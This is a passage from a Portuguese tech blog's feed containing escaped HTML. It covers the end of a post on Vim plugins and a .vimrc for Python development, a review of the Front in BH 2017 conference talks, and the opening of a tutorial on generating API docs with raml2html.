dos meus &lt;em&gt;plugins&lt;/em&gt; favoritos! Ele é um &lt;em&gt;wrapper&lt;/em&gt; que executa testes de diferentes granularidades, ou seja,
executa o teste de um arquivo apenas, da suíte inteira, do mais próximo, do último testado, etc.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;...&lt;span class="p"&gt;)&lt;/span&gt;

Plug &lt;span class="s1"&gt;&amp;#39;janko-m/vim-test&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;call&lt;/span&gt; plug#&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;...&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;let&lt;/span&gt; test#python#runner &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pytest&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No exemplo acima, o &lt;em&gt;runner&lt;/em&gt; configurado foi o &lt;a href="https://docs.pytest.org/en/latest/" title="pytest: helps you write better programs¶"&gt;&lt;em&gt;pytest&lt;/em&gt;&lt;/a&gt;,
mas dentro do ecossistema &lt;em&gt;Python&lt;/em&gt; ele suporta os seguintes &lt;em&gt;frameworks&lt;/em&gt; de testes: &lt;code&gt;PyTest&lt;/code&gt;, &lt;code&gt;Django&lt;/code&gt;, &lt;code&gt;Nose&lt;/code&gt;, &lt;code&gt;Nose2&lt;/code&gt;, e &lt;code&gt;PyUnit&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;É possível evocar o &lt;em&gt;plugin&lt;/em&gt; para os diferentes níveis de testes através dos comandos &lt;code&gt;:TestNearest&lt;/code&gt;, &lt;code&gt;:TestFile&lt;/code&gt;, &lt;code&gt;:TestSuite&lt;/code&gt;, &lt;code&gt;:TestLast&lt;/code&gt;
e &lt;code&gt;:TestVisit&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Bônus:&lt;/strong&gt; Utilizando o &lt;a href="https://github.com/tpope/vim-dispatch" title="dispatch.vim: asynchronous build and test dispatcher"&gt;&lt;em&gt;dispatch.vim&lt;/em&gt;&lt;/a&gt;
como &lt;em&gt;strategy&lt;/em&gt; no &lt;em&gt;vim-test&lt;/em&gt;, será possível executar os testes assincronamente.&lt;/p&gt;
&lt;h2&gt;Executar comandos: dispatch.vim&lt;/h2&gt;
&lt;p&gt;Com o &lt;a href="https://github.com/tpope/vim-dispatch" title="asynchronous build and test dispatcher"&gt;&lt;em&gt;dispatch.vim&lt;/em&gt;&lt;/a&gt;,
do &lt;a href="https://github.com/tpope" title="Perfil no Github"&gt;&lt;em&gt;Tim Pope&lt;/em&gt;&lt;/a&gt;, é possível executar comandos (como por exemplo,
&lt;em&gt;build&lt;/em&gt; ou testes) de forma assíncrona. O &lt;em&gt;plugin&lt;/em&gt; se responsabiliza por escolher a melhor plataforma
(&lt;em&gt;tmux&lt;/em&gt;, tela, &lt;em&gt;iTerm&lt;/em&gt;, &lt;em&gt;headless&lt;/em&gt;, etc) de acordo com o ambiente no qual o &lt;em&gt;Vim&lt;/em&gt; está rodando.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-dispatch.png" width="640" height="656" title="Exemplo de utilização do vim-dispatch" alt="Exemplo de utilização do vim-dispatch"&gt;&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;plugin&lt;/em&gt; (até o momento) não utiliza a estratégia de &lt;em&gt;jobs&lt;/em&gt; do &lt;em&gt;Vim 8&lt;/em&gt;. Mas &lt;a href="https://github.com/tpope/vim-dispatch/pull/193" title="Add initial vim jobs strategy"&gt;discussões sobre o assunto&lt;/a&gt;
tem ocorrido, e é possível que uma solução seja incorporada em breve. Se utilizar o &lt;em&gt;async&lt;/em&gt; do &lt;em&gt;Vim&lt;/em&gt; é um desejo,
o &lt;a href="https://github.com/skywind3000/asyncrun.vim" title="Run Async Shell Commands in Vim 8.0 / NeoVim and Output to Quickfix Window"&gt;&lt;em&gt;asyncrun.vim&lt;/em&gt;&lt;/a&gt;
pode ser uma melhor opção.&lt;/p&gt;
&lt;h3&gt;Bônus: tmux&lt;/h3&gt;
&lt;p&gt;Com o &lt;a href="https://github.com/tmux/tmux/wiki" title="tmux is a terminal multiplexer"&gt;&lt;em&gt;tmux&lt;/em&gt;&lt;/a&gt;, tanto o &lt;em&gt;vim-test&lt;/em&gt; quanto o &lt;em&gt;dispatch.vim&lt;/em&gt;
ficam ainda mais interessantes:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/vim-dispatch-tmux.png" width="640" height="516" title="Exemplo de utilização do vim-dispatch com tmux" alt="Exemplo de utilização do vim-dispatch com tmux"&gt;&lt;/p&gt;
&lt;p&gt;Interessado no &lt;em&gt;tmux&lt;/em&gt;? O &lt;em&gt;bugsnag&lt;/em&gt; possui um bom &lt;a href="https://blog.bugsnag.com/tmux-and-vim/" title="Tmux and Vim - even better together"&gt;artigo sobre &lt;em&gt;tmux&lt;/em&gt; + &lt;em&gt;Vim&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;O &lt;code&gt;.vimrc&lt;/code&gt; abaixo é o resultado de todos os &lt;em&gt;plugins&lt;/em&gt; apresentados nesse artigo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;&amp;quot; ~/.vimrc&lt;/span&gt;

&lt;span class="k"&gt;call&lt;/span&gt; plug#begin&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;~/.vim/plugged&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c"&gt;&amp;quot; Lista de plugins&lt;/span&gt;
Plug &lt;span class="s1"&gt;&amp;#39;sheerun/vim-polyglot&amp;#39;&lt;/span&gt;
Plug &lt;span class="s1"&gt;&amp;#39;w0rp/ale&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; { &lt;span class="s1"&gt;&amp;#39;do&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;pip install flake8 isort yapf&amp;#39;&lt;/span&gt; }
Plug &lt;span class="s1"&gt;&amp;#39;maralla/completor.vim&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; { &lt;span class="s1"&gt;&amp;#39;do&amp;#39;&lt;/span&gt;: &lt;span class="s1"&gt;&amp;#39;pip install jedi&amp;#39;&lt;/span&gt; }
Plug &lt;span class="s1"&gt;&amp;#39;davidhalter/jedi-vim&amp;#39;&lt;/span&gt;
Plug &lt;span class="s1"&gt;&amp;#39;ctrlpvim/ctrlp.vim&amp;#39;&lt;/span&gt;
Plug &lt;span class="s1"&gt;&amp;#39;scrooloose/nerdtree&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; Plug &lt;span class="s1"&gt;&amp;#39;Xuyuanp/nerdtree-git-plugin&amp;#39;&lt;/span&gt;
Plug &lt;span class="s1"&gt;&amp;#39;janko-m/vim-test&amp;#39;&lt;/span&gt;
Plug &lt;span class="s1"&gt;&amp;#39;tpope/vim-dispatch&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;call&lt;/span&gt; plug#&lt;span class="k"&gt;end&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="c"&gt;&amp;quot; Ale&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:ale_fix_on_save &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:ale_fixers &lt;span class="p"&gt;=&lt;/span&gt; {
\   &lt;span class="s1"&gt;&amp;#39;python&amp;#39;&lt;/span&gt;: [
\       &lt;span class="s1"&gt;&amp;#39;isort&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
\       &lt;span class="s1"&gt;&amp;#39;yapf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
\       &lt;span class="s1"&gt;&amp;#39;remove_trailing_lines&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
\       &lt;span class="s1"&gt;&amp;#39;trim_whitespace&amp;#39;&lt;/span&gt;
\   ]
\}

&lt;span class="c"&gt;&amp;quot; Jedi&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; &lt;span class="k"&gt;g&lt;/span&gt;:jedi#completions_enabled &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;

&lt;span class="c"&gt;&amp;quot; vim-test&lt;/span&gt;
&lt;span class="k"&gt;let&lt;/span&gt; test#python#runner &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;pytest&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Embora haja uma vertente que defende o uso mínimo (ou nulo) de &lt;em&gt;plugins&lt;/em&gt; no &lt;em&gt;Vim&lt;/em&gt;, para mim eles são um dos pontos altos do editor
e sem dúvida são os responsáveis por me ajudar a manter uma boa produtividade. Se você, assim como eu, não tem a mínima pretensão de
ser um "vim-master", use sem medo. Tenho certeza que eles te ajudarão a lidar com os problemas do dia a dia.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://justin.abrah.ms/vim/vim_and_python.html"&gt;&lt;em&gt;Justin Abrahms - Vim &amp;amp; Python: Making yourself at home&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://liuchengxu.org/posts/use-vim-as-a-python-ide/"&gt;&lt;em&gt;Liu-Cheng Xu - Use Vim as a Python IDE&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://realpython.com/blog/python/vim-and-python-a-match-made-in-heaven/"&gt;&lt;em&gt;Real Python - VIM and Python: a Match Made in Heaven&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://shapeshed.com/vim-packages/"&gt;&lt;em&gt;Shapeshed - Vim: So long Pathogen, hello native package loading&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="editores-de-texto"></category><category term="vim"></category><category term="python"></category></entry><entry><title>Opinião: Front in BH 2017</title><link href="https://klauslaube.com.br/2017/09/26/opiniao-front-in-bh-2017.html" rel="alternate"></link><published>2017-09-26T15:15:00-03:00</published><updated>2017-09-26T15:15:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-09-26:/2017/09/26/opiniao-front-in-bh-2017.html</id><summary type="html">&lt;p&gt;E &lt;a href="https://klauslaube.com.br/2013/08/05/opiniao-front-bh-2013.html" title="Opinião sobre a edição de 2013"&gt;mais uma vez&lt;/a&gt; tive
a oportunidade de acompanhar o trabalho do
&lt;a href="https://twitter.com/davidsonfellipe" title="Perfil do Careca no Twitter"&gt;&lt;em&gt;@davidsonfellipe&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://twitter.com/keppelen" title="Perfil do Giovanni no Twitter"&gt;&lt;em&gt;@keppelen&lt;/em&gt;&lt;/a&gt; e de tantos
outros colaboradores, na realização do &lt;a href="https://www.frontinbh.com.br/" title="Front in BH"&gt;&lt;em&gt;Front in BH 2k17&lt;/em&gt;&lt;/a&gt;.
Que na minha opinião é {hipérbole-alert} um dos melhores eventos de &lt;em&gt;front-end&lt;/em&gt; desse país {/hipérbole-alert}.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer 1:&lt;/strong&gt; Sim! Esse artigo é completamente parcial. Embora …&lt;/p&gt;</summary><content type="html">&lt;p&gt;E &lt;a href="https://klauslaube.com.br/2013/08/05/opiniao-front-bh-2013.html" title="Opinião sobre a edição de 2013"&gt;mais uma vez&lt;/a&gt; tive
a oportunidade de acompanhar o trabalho do
&lt;a href="https://twitter.com/davidsonfellipe" title="Perfil do Careca no Twitter"&gt;&lt;em&gt;@davidsonfellipe&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://twitter.com/keppelen" title="Perfil do Giovanni no Twitter"&gt;&lt;em&gt;@keppelen&lt;/em&gt;&lt;/a&gt; e de tantos
outros colaboradores, na realização do &lt;a href="https://www.frontinbh.com.br/" title="Front in BH"&gt;&lt;em&gt;Front in BH 2k17&lt;/em&gt;&lt;/a&gt;.
Que na minha opinião é {hipérbole-alert} um dos melhores eventos de &lt;em&gt;front-end&lt;/em&gt; desse país {/hipérbole-alert}.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer 1:&lt;/strong&gt; Sim! Esse artigo é completamente parcial. Embora eu seja (atualmente) um desenvolver &lt;em&gt;back-end&lt;/em&gt;,
tenho um enorme carinho por esse evento. E essa edição foi mais que especial pois a &lt;em&gt;Giselli Brasil&lt;/em&gt;,
minha esposa, esteve presente e assistiu as apresentações comigo.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Disclaimer 2:&lt;/strong&gt; Infelizmente não pude ficar até o final, e acabei perdendo as apresentações de
&lt;em&gt;Beto Muniz&lt;/em&gt;, &lt;em&gt;Paula Faria&lt;/em&gt;, &lt;em&gt;Marco Gigliarano&lt;/em&gt;, &lt;em&gt;Michael Lancaster&lt;/em&gt; e &lt;em&gt;Felipe Silva&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;O evento foi muito bom. Fora alguns probleminhas com o acesso a &lt;em&gt;Wi-fi&lt;/em&gt; (provavelmente mais culpa
minha do que da organização), a experiência foi muito boa (como tinha sido lá em 2013). É um evento
diferente de &lt;em&gt;Python Brasil&lt;/em&gt;, &lt;em&gt;FISL&lt;/em&gt; ou &lt;em&gt;BrazilJS&lt;/em&gt;. Menor e mais focado, com apenas uma trilha,
você sabe exatamente o que irá assistir. Isso não o torna menos interessante! Particularmente
gosto de eventos assim e as minhas expectativas foram completamente atendidas.&lt;/p&gt;
&lt;p&gt;Uma das conclusões que tirei é, caro leitor (principalmente você, nobre colega de &lt;em&gt;back-end&lt;/em&gt;),
se você estiver fazendo &lt;em&gt;front-end&lt;/em&gt; sem utilizar componentização, você não está "surfando a onda".&lt;/p&gt;
&lt;h2&gt;&lt;a href="https://twitter.com/tessamero" title="Perfil no Twitter"&gt;@tessamero&lt;/a&gt; - Revolutionize Your Workflow with ChatOps&lt;/h2&gt;
&lt;p&gt;Para abrir o dia, a &lt;em&gt;Tessa&lt;/em&gt; deu uma aula de simpatia e uma rápida introdução ao mundo dos
&lt;em&gt;ChatOps&lt;/em&gt;. Segundo a sua apresentação, &lt;em&gt;ChatOps&lt;/em&gt; é:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) a way of collaborating which connects teams, tools, &amp;amp; processes to
create an automated and transparent workflow.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Na &lt;a href="http://loadsmart.com/" title="Jabá da firma"&gt;&lt;em&gt;Loadsmart&lt;/em&gt;&lt;/a&gt; estamos testando o conceito
através de &lt;em&gt;Slack&lt;/em&gt; + &lt;em&gt;Heroku&lt;/em&gt;. O artigo do &lt;em&gt;Heroku Dev Center&lt;/em&gt; é uma maneira de
ver esse conceito funcionando na prática:
&lt;a href="https://devcenter.heroku.com/articles/chatops" title="Leia mais no Heroku Dev Center"&gt;https://devcenter.heroku.com/articles/chatops&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;iframe src="https://slideshare.net/slideshow/embed_code/80074496" width="590" height="481" marginwidth="0" marginheight="0" scrolling="no"&gt;&lt;/iframe&gt;&lt;/p&gt;
&lt;p&gt;A palestra em si foi bem introdutória, mas com conteúdo o suficiente para atiçar a curiosidade
do público.&lt;/p&gt;
&lt;h2&gt;&lt;a href="https://twitter.com/guilhermebruzzi" title="Perfil no Twitter"&gt;@guilhermebruzzi&lt;/a&gt; - App multiplataforma compartilhando 90% do código&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Guilherme&lt;/em&gt;, em uma das palestras mais interessantes do evento, apresentou como
a &lt;a href="https://pt.vtex.com/" title="A Verdadeira Plataforma Cloud Commerce"&gt;&lt;em&gt;VTEX&lt;/em&gt;&lt;/a&gt; leva a
multiplataforma para um novo nível, reaproveitando grande quantidade de código
no &lt;em&gt;Desktop&lt;/em&gt; e &lt;em&gt;Mobile&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Entre as ferramentas citadas, os já esperados &lt;a href="https://facebook.github.io/react/" title="A JavaScript library for building user interfaces"&gt;&lt;em&gt;React&lt;/em&gt;&lt;/a&gt;
e &lt;a href="https://facebook.github.io/react-native/" title="Learn once, write anywhere: Build mobile apps with React"&gt;&lt;em&gt;React Native&lt;/em&gt;&lt;/a&gt;
marcaram presença. Além disso, ouvimos falar também de &lt;a href="http://tachyons.io/" title="Built for designing"&gt;&lt;em&gt;Tachyons&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://github.com/jeffbski/redux-logic" title="Redux middleware for organizing all your business logic"&gt;&lt;em&gt;Redux Logic&lt;/em&gt;&lt;/a&gt; e
&lt;a href="https://github.com/rt2zz/redux-persist" title="Persist and rehydrate a redux store"&gt;&lt;em&gt;Redux Persist&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/in.png" width="640" height="491" title="Foto do logotipo do Front in BH" alt="Foto do logotipo do Front in BH"&gt;&lt;/p&gt;
&lt;p&gt;O que mais me chamou a atenção em seu &lt;em&gt;talk&lt;/em&gt; foi a parte de &lt;em&gt;bridging&lt;/em&gt; entre &lt;em&gt;React&lt;/em&gt; e
as interfaces nativas dos aparelhos. Confesso que até então não tinha ouvido falar do assunto:
&lt;a href="http://www.codepool.biz/react-native-bridging-modules-android.html" title="React Native Bridging Modules for Android from Scratch on Windows"&gt;http://www.codepool.biz/react-native-bridging-modules-android.html&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a href="https://twitter.com/diogomoretti_" title="Perfil no Twitter"&gt;@diogomoretti_&lt;/a&gt; - CSS {Grid} Layout&lt;/h2&gt;
&lt;p&gt;Logo na sequência veio o &lt;em&gt;Diogo Moretti&lt;/em&gt;, com toda a acidez e irreverência, dar um puxão de orelha
na galera que ainda acha que sistemas de &lt;em&gt;Grid&lt;/em&gt; são a salvação do mundo.&lt;/p&gt;
&lt;p&gt;Eu (que sou "&lt;a href="https://purecss.io/" title="A set of small, responsive CSS modules that you can use in every web project"&gt;&lt;em&gt;Pure CSS&lt;/em&gt;&lt;/a&gt; lover")
tomei um choque de realidade com essa palestra. O mundo do &lt;em&gt;front-end&lt;/em&gt; está mudando, e eu
simplesmente não fazia ideia de que havia uma maneira mais elegante de resolver a questão de &lt;em&gt;grids&lt;/em&gt;.&lt;/p&gt;
&lt;script async class="speakerdeck-embed" data-id="7c6d373964b7423dbff2b49cbdb16ecc" data-ratio="1.33333333333333" src="//speakerdeck.com/assets/embed.js"&gt;&lt;/script&gt;

&lt;p&gt;Um dos &lt;em&gt;highlights&lt;/em&gt; da apresentação foi:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Grids não-semânticos só fazem sentido com CSS Puro.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;E em tempos onde fazer "&lt;em&gt;CSS&lt;/em&gt; puro" está cada vez mais raro, tendo a concordar com a opinião do &lt;em&gt;Diogo&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Então, ao acabar de ler esse &lt;em&gt;post&lt;/em&gt;, não deixe de conferir:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://css-tricks.com/snippets/css/a-guide-to-flexbox/" title="A complete guide to Flexbox"&gt;&lt;em&gt;Flexbox&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://css-tricks.com/snippets/css/complete-guide-grid/" title="A Complete Guide to Grid"&gt;&lt;em&gt;CSS Grid Layout&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Felipe Silvestre &amp;amp; &lt;a href="https://twitter.com/markinmoura" title="Perfil no Twitter"&gt;@markinmoura&lt;/a&gt; - Level Up! Como evoluir as tecnologias da sua Startup?&lt;/h2&gt;
&lt;p&gt;O pessoal da &lt;a href="https://www.hotmart.com/pt/" title="Venda produtos digitais com simplicidade e segurança"&gt;&lt;em&gt;Hotmart&lt;/em&gt;&lt;/a&gt;
marcou presença no evento como patrocinadores e também como palestrantes. O tema foi o racional por trás
da escolha do &lt;a href="https://vuejs.org/" title="The Progressive JavaScript Framework"&gt;&lt;em&gt;Vue.js&lt;/em&gt;&lt;/a&gt;, levando em consideração o ambiente dinâmico de uma &lt;em&gt;Startup&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Através de um processo bem pragmático (e deveras democrático), eles foram capazes de escolher a ferramenta, medindo
diferentes aspectos e seus prós e contras.&lt;/p&gt;
&lt;p&gt;Estou aguardando ansiosamente a publicação dos &lt;em&gt;slides&lt;/em&gt; para "roubar" o método para mim.&lt;/p&gt;
&lt;h2&gt;Ilya Gurevich - Moving from Angular to React&lt;/h2&gt;
&lt;p&gt;E a &lt;em&gt;Loadsmart&lt;/em&gt;&lt;sup&gt;firma&lt;/sup&gt; também marcou presença, enviando o &lt;em&gt;Ilya&lt;/em&gt; para falar da experiência de mudar um
produto feito em &lt;em&gt;Angular&lt;/em&gt; para &lt;em&gt;React&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Eu sou completamente suspeito para falar sobre essa apresentação, já que trabalho com o &lt;em&gt;Ilya&lt;/em&gt;,
e sei das dores de manter a solução em &lt;em&gt;Angular&lt;/em&gt;. Mas o mais bacana é que ele abriu alguns detalhes,
como por exemplo, a necessidade de manter tanto &lt;a href="https://klauslaube.com.br/tag/grunt.html" title="Leia mais sobre Grunt"&gt;&lt;em&gt;Grunt&lt;/em&gt;&lt;/a&gt;
quanto &lt;em&gt;webpack&lt;/em&gt; rodando em paralelo, já que ainda existe um legado em &lt;em&gt;Angular&lt;/em&gt; que precisa estar operacional,
além das novas &lt;em&gt;features&lt;/em&gt; que ganham vida em &lt;em&gt;React&lt;/em&gt; diariamente.&lt;/p&gt;
&lt;p&gt;Além disso, deixou saliente as dificuldades de escrever &lt;em&gt;React&lt;/em&gt;, e os riscos de mover grandes pedaços de lógica
de negócio (que estão lá funcionando há anos) para uma nova ferramenta.&lt;/p&gt;
&lt;p&gt;Sem dúvida, uma palestra apaixonada.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Por motivos de força maior, não pude acompanhar as demais palestras do dia. Mas seguindo a reação do público no
&lt;em&gt;Twitter&lt;/em&gt;, fica evidente que o pessoal gostou bastante.&lt;/p&gt;
&lt;p&gt;Saí completamente satisfeito do Teatro &lt;em&gt;Ney Soares&lt;/em&gt;. E o cafézinho mineiro em &lt;em&gt;Confins&lt;/em&gt; foi a cereja do bolo.&lt;/p&gt;
&lt;p&gt;Veja a &lt;a href="https://gist.github.com/jcemer/6bdf0ef742dc1e6edcd1e045139fe329" title="Gist front-in-bh-2017-talks.md"&gt;lista de todas as palestras aqui&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima, e espero te encontrar no &lt;em&gt;Front in BH 2k18&lt;/em&gt; :)&lt;/p&gt;</content><category term="opiniao"></category><category term="front-end"></category><category term="evento"></category></entry><entry><title>Documentando a sua API com raml2html</title><link href="https://klauslaube.com.br/2017/09/16/documentando-sua-api-com-raml2html.html" rel="alternate"></link><published>2017-09-16T00:15:00-03:00</published><updated>2017-09-16T00:15:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2017-09-16:/2017/09/16/documentando-sua-api-com-raml2html.html</id><summary type="html">&lt;p&gt;Uma das coisas mais legais em relação ao &lt;a href="https://klauslaube.com.br/tag/raml.html" title="Leia mais sobre RAML"&gt;&lt;em&gt;RAML&lt;/em&gt;&lt;/a&gt;
(e afins) é a diversidade de ferramentas que existem em seu ecossistema.
Embora a especificação por si cumpra o seu papel, são elas que trazem
"mais cores" aos resultados práticos de ter uma &lt;em&gt;spec&lt;/em&gt; para a sua &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre API"&gt;&lt;em&gt;API&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;No universo do …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Uma das coisas mais legais em relação ao &lt;a href="https://klauslaube.com.br/tag/raml.html" title="Leia mais sobre RAML"&gt;&lt;em&gt;RAML&lt;/em&gt;&lt;/a&gt;
(e afins) é a diversidade de ferramentas que existem em seu ecossistema.
Embora a especificação por si cumpra o seu papel, são elas que trazem
"mais cores" aos resultados práticos de ter uma &lt;em&gt;spec&lt;/em&gt; para a sua &lt;a href="https://klauslaube.com.br/tag/apis.html" title="Leia mais sobre API"&gt;&lt;em&gt;API&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;No universo do &lt;em&gt;RAML&lt;/em&gt;, existe algumas boas ferramentas que geram documentação a partir da especificação.
Soluções que vão do &lt;a href="https://github.com/spotify/ramlfications" title="Conheça o Ramlfications"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://github.com/jhitchcock/raml2wiki" title="Conheça o raml2wiki"&gt;&lt;em&gt;Wikis&lt;/em&gt;&lt;/a&gt;,
&lt;a href="https://github.com/QuickenLoans/RAMLsharp" title="Leia mais sobre o RAMLsharp"&gt;&lt;em&gt;ASP.net&lt;/em&gt;&lt;/a&gt; e até ao
&lt;a href="https://github.com/isaacloud/sdk-gen" title="Gere SDKs usando RAML"&gt;&lt;em&gt;Java&lt;/em&gt;&lt;/a&gt;. Mas acredito
que a ferramenta mais atual seja o
&lt;a href="https://github.com/raml2html/raml2html" title="RAML to HTML documentation generator"&gt;&lt;em&gt;raml2html&lt;/em&gt;&lt;/a&gt;,
feito em &lt;a href="https://klauslaube.com.br/tag/nodejs.html" title="Leia mais sobre Node.js"&gt;&lt;em&gt;Node.js&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Simples, como as melhores coisas da vida&lt;/h2&gt;
&lt;p&gt;O &lt;a href="https://github.com/raml2html/raml2html" title="RAML to HTML documentation generator"&gt;&lt;em&gt;raml2html&lt;/em&gt;&lt;/a&gt;
é uma biblioteca que transforma &lt;em&gt;specs&lt;/em&gt; &lt;em&gt;RAML&lt;/em&gt; em &lt;a href="https://klauslaube.com.br/tag/html.html" title="Leia mais sobre HTML"&gt;&lt;em&gt;HTML&lt;/em&gt;&lt;/a&gt;.
E o mais legal é que a sua versão 4 suporta a versão 1.0 da linguagem.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/poesia-vogon.jpg" width="600" height="344" title="Aguenta mais um pouco dessa poesia Vogon (imagilendo.wordpress.com)" alt="Aguenta mais um pouco dessa poesia Vogon (imagilendo.wordpress.com)"&gt;&lt;/p&gt;
&lt;p&gt;Vamos aproveitar o "mini IMDB" construído no
&lt;a href="https://klauslaube.com.br/2017/01/31/ramilificando-as-suas-apis.html" title="Ramilificando as suas APIs"&gt;&lt;em&gt;post&lt;/em&gt; de &lt;em&gt;RAML&lt;/em&gt;&lt;/a&gt;, para
ilustrar como essa ferramenta funciona. Mas antes, aquele &lt;code&gt;npm install&lt;/code&gt; clássico:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ npm i -g raml2html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora é só chamar o utilitário de linha de comando:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ raml2html api.raml &amp;gt; index.html
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Pronto! Basta abrir o arquivo no seu navegador favorito:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/raml2html-example.png" width="640" height="415" title="Exemplo de documentação RAML" alt="Exemplo de documentação RAML"&gt;&lt;/p&gt;
&lt;p&gt;Simples, não? Calma que ainda não acabou! Existe a possibilidade de utilizar temas juntamente com o &lt;code&gt;raml2html&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ npm i -g raml2html-markdown-theme
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora basta passar o tema na hora de gerar a documentação:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ raml2html --theme raml2html-markdown-theme api.raml &amp;gt; index.md
&lt;/pre&gt;&lt;/div&gt;


